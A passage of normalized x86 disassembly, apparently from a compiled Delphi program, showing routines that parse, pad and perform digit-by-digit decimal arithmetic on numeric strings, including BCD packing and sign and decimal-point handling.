mov eax esi
mov edx [ ebp - 0x4 ]
call sub_4042b0
inc ebx
dec [ ebp - 0x24 ]
jne r-xdata
sub_481cd4
push ebp
mov ebp esp
add esp 0xffffffc0
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x3c ] ebx
mov [ ebp - 0x40 ] ebx
mov [ ebp - 0x30 ] ebx
mov [ ebp - 0x34 ] ebx
mov [ ebp - 0x38 ] ebx
mov [ ebp - 0x24 ] ebx
mov [ ebp - 0x18 ] ebx
mov [ ebp - 0x1c ] ebx
mov [ ebp - 0x4 ] ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_481ead
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ rw-data ]
mov al [ eax ]
mov [ ebp - 0x1d ] al
lea eax [ ebp - 0x1c ]
push eax
mov eax ebx
call sub_404264
push eax
mov eax esi
call sub_404264
push eax
lea eax [ ebp - 0xc ]
push eax
lea eax [ ebp - 0x10 ]
push eax
lea eax [ ebp - 0x8 ]
push eax
lea ecx [ ebp - 0x18 ]
mov edx esi
mov eax ebx
call sub_481708
mov eax [ ebp - 0x1c ]
call sub_404464
mov [ ebp - 0x14 ] eax
mov esi 0x1
xor edi edi
mov ebx [ ebp - 0x10 ]
dec ebx
cmp ebx 0x0
jl r-xdata
mov eax edi
xor edx edx
push edx
push eax
mov eax [ ebp - 0x4 ]
call sub_4084f4
cmp [ ebp - 0x8 ] 0xffffff01
je r-xdata
mov eax [ ebp - 0x18 ]
call sub_408544
mov edx [ ebp - 0x14 ]
movzx edx [ edx + ebx ]
sub edx 0x30
imul edx
imul esi
add edi eax
mov eax esi
add eax eax
lea eax [ eax + eax * 4 ]
mov esi eax
dec ebx
cmp ebx 0xffffffff
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_481eb4
lea eax [ ebp - 0x40 ]
mov edx 0x5
call sub_403fc8
lea eax [ ebp - 0x24 ]
call sub_403fa4
lea eax [ ebp - 0x1c ]
mov edx 0x2
call sub_403fc8
retn
mov eax [ ebp - 0x4 ]
mov eax [ eax ]
call sub_404264
mov ebx eax
sub ebx [ ebp - 0x8 ]
test ebx ebx
jne r-xdata
test ebx ebx
jle r-xdata
mov edx r-xdata
lea eax [ ebp - 0x28 ]
call sub_402b4c
lea eax [ ebp - 0x2c ]
mov dl [ ebp - 0x1d ]
mov [ eax + 0x1 ] dl
mov [ eax ] 0x1
lea edx [ ebp - 0x2c ]
lea eax [ ebp - 0x28 ]
mov cl 0x2
call sub_402b1c
lea edx [ ebp - 0x28 ]
lea eax [ ebp - 0x24 ]
call sub_404208
mov edx [ ebp - 0x24 ]
mov ecx [ ebp - 0x4 ]
mov ecx [ ecx ]
mov eax [ ebp - 0x4 ]
call sub_4042b0
jmp r-xdata
test ebx ebx
jge r-xdata
lea eax [ ebp - 0x30 ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax ]
mov ecx ebx
mov edx 0x1
call sub_4044c4
push [ ebp - 0x30 ]
lea eax [ ebp - 0x34 ]
mov dl [ ebp - 0x1d ]
call sub_40418c
push [ ebp - 0x34 ]
lea eax [ ebp - 0x38 ]
push eax
lea edx [ ebx + 0x1 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax ]
mov ecx [ ebp - 0x8 ]
call sub_4044c4
push [ ebp - 0x38 ]
mov eax [ ebp - 0x4 ]
mov edx 0x3
call sub_404324
jmp r-xdata
lea eax [ ebp - 0x3c ]
mov dl [ ebp - 0x1d ]
call sub_40418c
push [ ebp - 0x3c ]
lea ecx [ ebp - 0x40 ]
mov edx ebx
neg edx
mov al 0x30
call sub_404654
push [ ebp - 0x40 ]
mov eax [ ebp - 0x4 ]
push [ eax ]
mov eax [ ebp - 0x4 ]
mov edx 0x3
call sub_404324
sub_481ec0
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
mov ebx [ ebp + 0x8 ]
mov esi [ ebp + 0x10 ]
mov eax esi
call sub_404264
mov [ ebp - 0xa ] ax
mov eax esi
call sub_404464
movsx edi [ ebp - 0xa ]
mov edx edi
dec edx
add eax edx
mov [ ebp - 0x8 ] eax
mov edx edi
inc edx
mov eax ebx
call sub_4045f0
mov eax [ ebx ]
call sub_404464
movsx edx [ ebp - 0xa ]
add eax edx
mov [ ebp - 0x4 ] eax
push ecx
push edi
push esi
push ebx
mov bh 0xa
mov edi [ ebp - 0x4 ]
mov esi [ ebp - 0x8 ]
mov cx [ ebp - 0xa ]
mov dx 0x0
add dl 0x30
mov [ edi ] dl
pop ebx
pop esi
pop edi
pop ecx
mov eax [ ebx ]
cmp [ eax ] 0x30
jne r-xdata
mov al [ esi ]
sub esi 0x1
sub al 0x30
mul [ ebp + 0xc ]
add ax dx
mov dx 0x0
div bh
mov dl al
add ah 0x30
mov [ edi ] ah
sub edi 0x1
sub cx 0x1
jmp r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0xc
push ebx
mov eax [ ebx ]
call sub_404264
mov ecx eax
dec ecx
mov eax [ ebx ]
mov edx 0x2
call sub_4044c4
cmp cx 0x0
je r-xdata
sub_481f74
push ebp
mov ebp esp
push ecx
mov ecx 0xa
push 0x0
push 0x0
dec ecx
jne r-xdata
push ecx
xchg [ ebp - 0x4 ] ecx
push ebx
push esi
push edi
mov ebx ecx
mov edi edx
mov esi eax
xor eax eax
push ebp
push sub_4821d8
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ rw-data ]
mov al [ eax ]
mov [ ebp - 0x29 ] al
lea eax [ ebp - 0x20 ]
push eax
mov eax esi
call sub_404264
push eax
mov eax edi
call sub_404264
push eax
lea eax [ ebp - 0x8 ]
push eax
lea eax [ ebp - 0xc ]
push eax
lea eax [ ebp - 0x4 ]
push eax
lea ecx [ ebp - 0x1c ]
mov edx edi
mov eax esi
call sub_481708
mov eax [ ebp - 0x1c ]
call sub_404264
mov [ ebp - 0x24 ] eax
mov eax [ ebp - 0x20 ]
call sub_404264
mov [ ebp - 0x28 ] eax
mov eax [ ebp - 0x20 ]
call sub_404464
mov edi eax
lea eax [ ebp - 0x10 ]
call sub_403fa4
mov esi [ ebp - 0xc ]
dec esi
cmp esi 0x0
jl r-xdata
mov eax ebx
mov edx [ ebp - 0x14 ]
call sub_403ff8
jmp r-xdata
cmp [ ebp - 0x8 ] 0x9
jge r-xdata
mov eax [ ebx ]
cmp [ eax ] 0x30
je r-xdata
mov eax [ ebp - 0x1c ]
push eax
mov al [ edi + esi ]
sub al 0x30
push eax
lea eax [ ebp - 0x34 ]
push eax
call sub_481ec0
mov edx [ ebp - 0x34 ]
lea eax [ ebp - 0x18 ]
mov ecx [ ebp - 0x10 ]
call sub_4042b0
mov eax [ ebp - 0x1c ]
call sub_408544
xor edx edx
mov dl [ edi + esi ]
sub edx 0x30
imul edx
xor edx edx
push edx
push eax
lea eax [ ebp - 0x30 ]
call sub_4084f4
mov edx [ ebp - 0x30 ]
lea eax [ ebp - 0x18 ]
mov ecx [ ebp - 0x10 ]
call sub_4042b0
jmp r-xdata
push ebx
mov eax [ ebx ]
call sub_404264
mov ecx eax
dec ecx
mov eax [ ebx ]
mov edx 0x2
call sub_4044c4
cmp [ ebp - 0x4 ] 0xffffff01
je r-xdata
lea ecx [ ebp - 0x38 ]
mov edx [ ebp - 0x14 ]
mov eax [ ebp - 0x18 ]
call sub_481970
mov edx [ ebp - 0x38 ]
lea eax [ ebp - 0x14 ]
call sub_40403c
lea eax [ ebp - 0x10 ]
mov edx r-xdata
call sub_40426c
dec esi
cmp esi 0xffffffff
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4821df
lea eax [ ebp - 0x58 ]
mov edx 0x5
call sub_403fc8
lea eax [ ebp - 0x3c ]
mov edx 0x4
call sub_403fc8
lea eax [ ebp - 0x20 ]
mov edx 0x5
call sub_403fc8
retn
mov eax [ ebx ]
call sub_404264
mov esi eax
sub esi [ ebp - 0x4 ]
test esi esi
jne r-xdata
test esi esi
jle r-xdata
mov edx r-xdata
lea eax [ ebp - 0x40 ]
call sub_402b4c
lea eax [ ebp - 0x44 ]
mov dl [ ebp - 0x29 ]
mov [ eax + 0x1 ] dl
mov [ eax ] 0x1
lea edx [ ebp - 0x44 ]
lea eax [ ebp - 0x40 ]
mov cl 0x2
call sub_402b1c
lea edx [ ebp - 0x40 ]
lea eax [ ebp - 0x3c ]
call sub_404208
mov edx [ ebp - 0x3c ]
mov ecx [ ebx ]
mov eax ebx
call sub_4042b0
jmp r-xdata
test esi esi
jge r-xdata
lea eax [ ebp - 0x48 ]
push eax
mov eax [ ebx ]
mov ecx esi
mov edx 0x1
call sub_4044c4
push [ ebp - 0x48 ]
lea eax [ ebp - 0x4c ]
mov dl [ ebp - 0x29 ]
call sub_40418c
push [ ebp - 0x4c ]
lea eax [ ebp - 0x50 ]
push eax
lea edx [ esi + 0x1 ]
mov eax [ ebx ]
mov ecx [ ebp - 0x4 ]
call sub_4044c4
push [ ebp - 0x50 ]
mov eax ebx
mov edx 0x3
call sub_404324
jmp r-xdata
mov eax [ ebp - 0x24 ]
add eax [ ebp - 0x28 ]
cmp eax 0x400
jle r-xdata
lea eax [ ebp - 0x54 ]
mov dl [ ebp - 0x29 ]
call sub_40418c
push [ ebp - 0x54 ]
lea ecx [ ebp - 0x58 ]
mov edx esi
neg edx
mov al 0x30
call sub_404654
push [ ebp - 0x58 ]
push [ ebx ]
mov eax ebx
mov edx 0x3
call sub_404324
mov eax ebx
call sub_403fa4
sub_4821f8
push ebp
mov ebp esp
push ecx
push ebx
lea ebx [ ebp - 0x1 ]
mov eax [ rw-data ]
mov al [ eax ]
mov [ ebp - 0x2 ] al
push eax
push ebx
push ecx
push edx
push edi
mov edi [ ebp + 0x10 ]
mov [ ebp - 0x1 ] 0x0
mov cl 0x0
mov ch 0x0
mov ah [ ebp + 0x8 ]
mov dl 0x0
mov dh 0x0
cmp al 0x0
je r-xdata
add dh al
mov dl 0x1
cmp cl 0x0
jne r-xdata
cmp al [ ebp - 0x2 ]
je r-xdata
cmp dh 0x6b
ja r-xdata
mov cl 0x1
mov dl 0x0
mov edi [ ebp + 0xc ]
jmp r-xdata
mov al [ edi ]
add edi 0x1
cmp dl 0x0
jne r-xdata
add ch 0x1
jmp r-xdata
cmp ch ah
ja r-xdata
add ah 0x1
pop edi
pop edx
pop ecx
pop ebx
pop eax
mov al [ ebx ]
pop ebx
pop ecx
pop ebp
retn 0xc
mov [ ebp - 0x1 ] 0x1
sub_482268
push ebx
push esi
push edi
mov esi eax
mov bl 0x1
mov eax esi
call sub_404264
test eax eax
jle r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
retn
mov edi 0x1
inc edi
dec eax
jne r-xdata
sub dl 0x2
je r-xdata
mov dl [ esi + edi - 0x1 ]
sub dl 0x2e
je r-xdata
xor ebx ebx
jmp r-xdata
sub_48229c
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov eax ebx
call sub_482268
test al al
jne r-xdata
mov eax edi
mov edx r-xdata
call sub_403ff8
jmp r-xdata
mov eax esi
call sub_482268
test al al
je r-xdata
pop edi
pop esi
pop ebx
retn
mov eax ebx
call sub_404464
push eax
mov eax esi
call sub_404464
push eax
push 0x9
call sub_4821f8
test al al
je r-xdata
mov ecx edi
mov edx esi
mov eax ebx
call sub_481f74
mov ecx edi
mov edx esi
mov eax ebx
call sub_481cd4
jmp r-xdata
sub_48230c
push ebp
mov ebp esp
push 0x0
push 0x0
push 0x0
push 0x0
push ebx
push esi
push edi
mov ebx ecx
mov edi edx
mov [ ebp - 0x4 ] eax
mov esi [ ebp + 0x8 ]
xor eax eax
push ebp
push sub_4823ad
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
mov edx [ ebp - 0x4 ]
call sub_403ff8
mov eax esi
mov edx r-xdata
call sub_403ff8
jmp r-xdata
mov eax [ ebx ]
mov edx edi
call sub_481654
test eax eax
jge r-xdata
mov eax [ esi ]
call sub_408544
inc eax
lea edx [ ebp - 0x8 ]
call sub_408408
mov edx [ ebp - 0x8 ]
mov eax esi
call sub_403ff8
lea ecx [ ebp - 0x10 ]
mov eax [ ebx ]
mov edx edi
call sub_481ad0
mov eax [ ebp - 0x10 ]
lea edx [ ebp - 0xc ]
call sub_481618
mov edx [ ebp - 0xc ]
mov eax ebx
call sub_403ff8
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4823b4
lea eax [ ebp - 0x10 ]
mov edx 0x3
call sub_403fc8
retn
sub_4823cc
push ebp
mov ebp esp
push ecx
mov ecx 0x4
push 0x0
push 0x0
dec ecx
jne r-xdata
xchg [ ebp - 0x4 ] ecx
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_482551
push [ fs : eax ]
mov [ fs : eax ] esp
mov ebx [ rw-data ]
mov bl [ ebx ]
mov eax edi
mov edx [ ebp - 0x4 ]
call sub_403ff8
jmp r-xdata
mov eax [ edi ]
cmp [ eax ] 0x30
je r-xdata
push edi
mov eax [ edi ]
call sub_404264
mov ecx eax
dec ecx
mov eax [ edi ]
mov edx 0x2
call sub_4044c4
test si si
jne r-xdata
test si si
jle r-xdata
mov ecx [ edi ]
mov eax edi
mov edx r-xdata
call sub_4042b0
jmp r-xdata
mov eax [ edi ]
call sub_404264
movsx edx si
neg edx
cmp eax edx
jg r-xdata
mov edx r-xdata
lea eax [ ebp - 0xc ]
call sub_402b4c
lea eax [ ebp - 0x10 ]
mov edx ebx
mov [ eax + 0x1 ] dl
mov [ eax ] 0x1
lea edx [ ebp - 0x10 ]
lea eax [ ebp - 0xc ]
mov cl 0x2
call sub_402b1c
lea edx [ ebp - 0xc ]
lea eax [ ebp - 0x8 ]
call sub_404208
push [ ebp - 0x8 ]
lea ecx [ ebp - 0x14 ]
movsx edx si
mov al 0x30
call sub_404654
push [ ebp - 0x14 ]
push [ edi ]
mov eax edi
mov edx 0x3
call sub_404324
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_482558
lea eax [ ebp - 0x24 ]
mov edx 0x5
call sub_403fc8
lea eax [ ebp - 0x8 ]
call sub_403fa4
retn
mov eax [ edi ]
call sub_404264
movsx edx si
neg edx
cmp eax edx
jle r-xdata
mov eax [ edi ]
call sub_404264
movsx edx si
neg edx
sub edx eax
lea ecx [ ebp - 0x18 ]
mov al 0x30
call sub_404654
mov edx [ ebp - 0x18 ]
mov eax edi
call sub_40426c
jmp r-xdata
lea eax [ ebp - 0x1c ]
push eax
movsx ecx si
neg ecx
mov eax [ edi ]
mov edx 0x1
call sub_4044c4
push [ ebp - 0x1c ]
lea eax [ ebp - 0x20 ]
mov edx ebx
call sub_40418c
push [ ebp - 0x20 ]
lea eax [ ebp - 0x24 ]
push eax
mov eax [ edi ]
call sub_404264
mov ecx eax
movsx edx si
neg edx
inc edx
mov eax [ edi ]
call sub_4044c4
push [ ebp - 0x24 ]
mov eax edi
mov edx 0x3
call sub_404324
sub_482570
push ebp
mov ebp esp
mov ecx 0x6
push 0x0
push 0x0
dec ecx
jne r-xdata
push ecx
push ebx
push esi
push edi
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_404454
xor eax eax
push ebp
push sub_4827cb
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ rw-data ]
mov al [ eax ]
mov [ ebp - 0xd ] al
lea eax [ ebp - 0x14 ]
mov dl [ ebp - 0xd ]
call sub_40418c
mov eax [ ebp - 0x14 ]
mov edx [ ebp - 0x4 ]
call sub_4045a8
mov esi eax
test si si
jle r-xdata
mov eax [ ebp - 0x4 ]
call sub_404264
mov esi eax
dec esi
mov eax ebx
mov edx r-xdata
call sub_403ff8
mov eax ebx
mov edx r-xdata
call sub_403ff8
sub si 0x2
mov eax [ ebp - 0x4 ]
call sub_404464
mov al [ eax ]
cmp al [ ebp - 0xd ]
jne r-xdata
lea ecx [ ebp - 0x28 ]
mov edx esi
dec edx
mov eax [ ebx ]
call sub_4823cc
mov edx [ ebp - 0x28 ]
mov eax ebx
call sub_403ff8
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_404264
mov edx eax
dec edx
lea ecx [ ebp - 0x24 ]
mov al 0x30
call sub_404654
mov ecx [ ebp - 0x24 ]
lea eax [ ebp - 0x20 ]
mov edx r-xdata
call sub_4042b0
mov edx [ ebp - 0x20 ]
mov eax [ ebp - 0x4 ]
call sub_4043b0
jne r-xdata
mov al [ r-xdata ]
push eax
lea eax [ ebp - 0x18 ]
push eax
lea eax [ ebp - 0x1c ]
mov dl [ ebp - 0xd ]
call sub_40418c
mov edx [ ebp - 0x1c ]
xor ecx ecx
mov eax [ ebp - 0x4 ]
call sub_40d0f0
mov edx [ ebp - 0x18 ]
lea eax [ ebp - 0x4 ]
call sub_40403c
jmp r-xdata
lea eax [ ebp - 0x4 ]
push eax
mov eax [ ebp - 0x4 ]
call sub_404264
mov ecx eax
dec ecx
mov edx 0x2
mov eax [ ebp - 0x4 ]
call sub_4044c4
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4827d2
lea eax [ ebp - 0x34 ]
mov edx 0x9
call sub_403fc8
lea eax [ ebp - 0xc ]
mov edx 0x3
call sub_403fc8
retn
lea eax [ ebp - 0xc ]
mov edx r-xdata
call sub_40403c
lea eax [ ebp - 0x8 ]
mov edx [ ebp - 0xc ]
call sub_40403c
mov eax [ ebp - 0xc ]
call sub_404264
mov edi eax
dec edi
lea ecx [ ebp - 0x2c ]
movsx edx di
mov al 0x30
call sub_404654
mov edx [ ebp - 0x2c ]
lea eax [ ebp - 0xc ]
call sub_40426c
mov edx [ ebp - 0x4 ]
mov eax [ ebp - 0xc ]
call sub_481654
test eax eax
jge r-xdata
mov eax [ ebp - 0x4 ]
mov edx r-xdata
call sub_4043b0
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_404464
cmp [ eax ] 0x30
je r-xdata
mov eax ebx
call sub_403fa4
jmp r-xdata
lea eax [ ebp - 0xc ]
mov edx r-xdata
call sub_40426c
mov eax ebx
mov edx r-xdata
call sub_40426c
lea eax [ ebp - 0x4 ]
push eax
mov eax [ ebp - 0x4 ]
call sub_404264
mov ecx eax
dec ecx
mov edx 0x2
mov eax [ ebp - 0x4 ]
call sub_4044c4
dec esi
jmp r-xdata
mov eax [ ebp - 0x8 ]
mov edx r-xdata
call sub_4043b0
je r-xdata
lea ecx [ ebp - 0x34 ]
mov eax [ ebx ]
mov edx esi
call sub_4823cc
mov edx [ ebp - 0x34 ]
mov eax ebx
call sub_403ff8
mov eax [ ebx ]
call sub_404264
movsx edx di
add edx 0x40
cmp eax edx
jl r-xdata
lea eax [ ebp - 0x30 ]
push eax
lea ecx [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
mov eax [ ebp - 0xc ]
call sub_48230c
mov edx [ ebp - 0x30 ]
mov eax ebx
call sub_40426c
lea eax [ ebp - 0xc ]
mov ecx r-xdata
mov edx [ ebp - 0x8 ]
call sub_4042b0
sub_482804
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
xor ebx ebx
mov [ ebp - 0xc ] ebx
mov esi ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_404454
mov eax [ ebp - 0x8 ]
call sub_404454
xor eax eax
push ebp
push sub_482961
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_404464
mov al [ eax ]
push eax
mov eax [ ebp - 0x8 ]
call sub_404464
pop edx
cmp dl [ eax ]
je r-xdata
xor eax eax
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_404464
mov bl [ eax ]
cmp bl 0x2d
je r-xdata
mov ebx eax
mov eax [ ebp - 0x4 ]
call sub_404464
cmp [ eax ] 0x2d
jne r-xdata
mov al 0x1
cmp bl 0x2d
je r-xdata
mov eax [ ebp - 0x8 ]
call sub_404464
cmp [ eax ] 0x2d
jne r-xdata
lea eax [ ebp - 0x4 ]
push eax
mov eax [ ebp - 0x4 ]
call sub_404264
mov ecx eax
dec ecx
mov edx 0x2
mov eax [ ebp - 0x4 ]
call sub_4044c4
mov eax [ ebp - 0x4 ]
call sub_404464
cmp [ eax ] 0x30
je r-xdata
lea eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0x8 ]
call sub_404264
mov ecx eax
dec ecx
mov edx 0x2
mov eax [ ebp - 0x8 ]
call sub_4044c4
jmp r-xdata
lea eax [ ebp - 0x4 ]
push eax
mov eax [ ebp - 0x4 ]
call sub_404264
mov ecx eax
dec ecx
mov edx 0x2
mov eax [ ebp - 0x4 ]
call sub_4044c4
jmp r-xdata
mov eax [ ebp - 0x8 ]
call sub_404464
cmp [ eax ] 0x30
je r-xdata
lea eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0x8 ]
call sub_404264
mov ecx eax
dec ecx
mov edx 0x2
mov eax [ ebp - 0x8 ]
call sub_4044c4
mov edx esi
mov eax [ ebp - 0x8 ]
call sub_482570
lea ecx [ ebp - 0xc ]
mov edx [ esi ]
mov eax [ ebp - 0x4 ]
call sub_48229c
mov edx [ ebp - 0xc ]
mov eax esi
call sub_403ff8
test bl bl
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_482968
lea eax [ ebp - 0xc ]
mov edx 0x3
call sub_403fc8
retn
mov ecx [ esi ]
mov eax esi
mov edx r-xdata
call sub_4042b0
sub_48297c
push ebp
mov ebp esp
push 0x0
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_482a58
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
call sub_482268
test al al
je r-xdata
mov eax esi
mov edx r-xdata
call sub_4043b0
jne r-xdata
mov eax esi
call sub_482268
test al al
je r-xdata
mov eax esi
mov edx r-xdata
call sub_4043b0
jne r-xdata
mov eax edi
mov edx ebx
call sub_403ff8
jmp r-xdata
test ebx ebx
je r-xdata
mov edx esi
mov eax ebx
call sub_408130
test eax eax
jne r-xdata
mov eax edi
mov ecx ebx
mov edx r-xdata
call sub_4042b0
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_482a5f
lea eax [ ebp - 0x4 ]
call sub_403fa4
retn
mov eax edi
mov edx r-xdata
call sub_403ff8
jmp r-xdata
mov eax ebx
mov edx r-xdata
call sub_4043b0
jne r-xdata
mov ecx edi
mov edx esi
mov eax ebx
call sub_482804
mov eax edi
mov edx r-xdata
call sub_403ff8
jmp r-xdata
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_405ecc
mov eax [ ebp - 0x4 ]
call sub_480be8
jmp r-xdata
sub_482ac8
cmp cl ch
jae r-xdata
retn
mov ah dl
add cl 0x1
cmp cl ch
jne r-xdata
lodsb [ esi ]
mov dl al
shr al 0x4
mov al 0x0
jmp r-xdata
and ah 0xf
shl ah 0x4
or ah al
mov al ah
stosb [ edi ]
add cl 0x1
jmp sub_482ac8
sub_482b00
push ebp
mov ebp esp
push esi
push edi
push ebx
push ecx
push edx
mov edi [ ebp + 0x8 ]
mov esi [ ebp + 0x1c ]
mov cl [ ebp + 0x10 ]
mov ch [ ebp + 0xc ]
cmp cl [ ebp + 0x18 ]
ja r-xdata
sub cl [ ebp + 0x18 ]
cmp cl [ ebp + 0x18 ]
je r-xdata
mov ch [ ebp + 0xc ]
mov cl [ ebp + 0x18 ]
cmp ch [ ebp + 0x14 ]
jae r-xdata
sub cl 0x1
cmp cl 0x0
je r-xdata
add cl [ ebp + 0x14 ]
call sub_482ab8
cmp ch [ ebp + 0x14 ]
je r-xdata
mov ah [ ebp + 0x18 ]
sub ah [ ebp + 0x10 ]
mov cl [ ebp + 0x18 ]
add cl [ ebp + 0x14 ]
add cl ch
jmp r-xdata
lodsb [ esi ]
mov dl al
shr al 0x4
or al 0x0
stosb [ edi ]
mov al dl
mov ah [ ebp + 0x18 ]
mov [ ebp + 0x10 ] ah
mov cl 0x1
jmp r-xdata
mov al 0x0
stosb [ edi ]
sub cl 0x1
jmp r-xdata
pop edx
pop ecx
pop ebx
pop edi
pop esi
pop ebp
retn 0x18
mov cl ch
call sub_482af0
jmp r-xdata
lodsb [ esi ]
cmp al 0x0
je r-xdata
sub cl [ ebp + 0x18 ]
call sub_482af0
call sub_482ab8
mov cl [ ebp + 0x10 ]
cmp cl [ ebp + 0x18 ]
jbe r-xdata
mov dl al
cmp ch [ ebp + 0x14 ]
jbe r-xdata
cmp cl 0x0
je r-xdata
sub ah 0x1
cmp ah 0x0
je r-xdata
mov [ edi ] al
add edi 0x1
add ch [ ebp + 0x10 ]
mov cl 0x0
call sub_482ac8
mov cl [ ebp + 0xc ]
cmp cl [ ebp + 0x14 ]
jbe r-xdata
mov ch [ ebp + 0x14 ]
sub ah 0x1
sub cl 0x2
jmp r-xdata
sub cl [ ebp + 0x14 ]
call sub_482af0
jmp r-xdata
cmp ah 0x0
je r-xdata
sub_482be4
push ebp
mov ebp esp
push ecx
mov eax [ rw-data ]
mov al [ eax ]
mov [ ebp - 0x1 ] al
push esi
push edi
push ebx
mov esi [ ebp + 0xc ]
mov edi [ ebp + 0x10 ]
xor ecx ecx
mov cx [ ebp + 0x8 ]
mov dl 0x0
cld
loop r-xdata
sub al 0x30
cmp dl 0x0
jne r-xdata
lodsb [ esi ]
cmp al [ ebp - 0x1 ]
je r-xdata
cmp dl 0x0
je r-xdata
or al ah
stosb [ edi ]
shl al 0x4
mov ah al
jmp r-xdata
pop ebx
pop edi
pop esi
pop ecx
pop ebp
retn 0xc
mov al ah
stosb [ edi ]
not dl
sub_482c30
push ebx
push esi
push edi
add esp 0xffffffdc
mov edx [ rw-data ]
mov dl [ edx ]
mov [ esp + 0x1 ] dl
mov esi eax
mov [ esp ] 0x0
jmp r-xdata
mov bl [ esi ]
test bl bl
jne r-xdata
push esi
mov esi r-xdata
lea edi [ esp + 0x8 ]
mov ecx 0x8
[ edi ] [ esi ]
pop esi
mov al [ esp + 0x1 ]
and eax 0xff
bts [ esp + 0x4 ] eax
and ebx 0xff
bt [ esp + 0x4 ] ebx
jb r-xdata
mov al [ esp ]
add esp 0x24
pop edi
pop esi
pop ebx
retn
inc esi
mov [ esp ] 0x1
jmp r-xdata
sub_482cb0
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x4 ] edx
mov esi eax
xor eax eax
push ebp
push sub_482e85
push [ fs : eax ]
mov [ fs : eax ] esp
mov ebx [ rw-data ]
mov bl [ ebx ]
mov eax esi
call sub_404464
call sub_482c30
test al al
je r-xdata
mov eax esi
mov edx r-xdata
call sub_4043b0
je r-xdata
mov [ ebp - 0x5 ] 0x0
jmp r-xdata
mov [ ebp - 0x5 ] 0x1
mov eax [ ebp - 0x4 ]
mov [ eax ] 0x8
mov eax [ ebp - 0x4 ]
mov [ eax + 0x1 ] 0x2
mov ebx [ ebp - 0x4 ]
add ebx 0x2
mov eax ebx
xor ecx ecx
mov edx 0x20
call sub_402c68
jmp r-xdata
test esi esi
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_482e8c
lea eax [ ebp - 0xc ]
call sub_403fa4
retn
mov [ ebp - 0x5 ] 0x1
mov [ ebp - 0x6 ] 0x0
lea eax [ ebp - 0xc ]
mov edx ebx
call sub_40418c
mov eax [ ebp - 0xc ]
mov edx esi
call sub_4045a8
mov edi eax
mov eax esi
call sub_404464
mov ebx eax
jmp r-xdata
mov al [ ebx ]
mov edx eax
and edx 0xff
bt [ rw-data ] edx
jb r-xdata
inc ebx
test di di
jbe r-xdata
cmp al 0x30
je r-xdata
dec edi
mov eax ebx
call sub_408bb4
lea esi [ ebx + eax - 0x1 ]
jmp r-xdata
mov al [ esi ]
and eax 0xff
bt [ rw-data ] eax
jb r-xdata
mov [ esi ] 0x0
dec esi
cmp [ ebx ] 0x2d
jne r-xdata
mov al [ ebx ]
cmp al 0x2d
je r-xdata
mov [ ebp - 0x6 ] 0x1
test di di
jbe r-xdata
inc ebx
cmp al 0x2b
jne r-xdata
dec edi
mov eax ebx
call sub_408bb4
mov [ ebp - 0x8 ] ax
cmp [ ebp - 0x8 ] 0x40
jbe r-xdata
inc ebx
test di di
jbe r-xdata
mov esi [ ebp - 0x4 ]
add esi 0x2
mov eax esi
xor ecx ecx
mov edx 0x20
call sub_402c68
cmp [ ebx ] 0x30
jne r-xdata
cmp [ ebp - 0x8 ] 0x0
jbe r-xdata
test di di
jbe r-xdata
dec edi
mov eax [ ebp - 0x4 ]
mov [ eax ] 0xa
mov eax [ ebp - 0x4 ]
mov [ eax + 0x1 ] 0x2
push esi
push ebx
mov ax [ ebp - 0x8 ]
push eax
call sub_482be4
jmp r-xdata
mov al [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
mov [ edx ] al
jmp r-xdata
cmp di 0x40
ja r-xdata
mov al [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
mov [ edx ] al
cmp [ ebp - 0x6 ] 0x0
je r-xdata
mov al [ ebp - 0x8 ]
mov edx eax
dec edx
mov ecx [ ebp - 0x4 ]
mov [ ecx ] dl
cmp [ ebp - 0x6 ] 0x0
je r-xdata
test di di
jbe r-xdata
mov [ ebp - 0x8 ] 0x40
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov [ eax + 0x1 ] 0x0
mov eax [ ebp - 0x4 ]
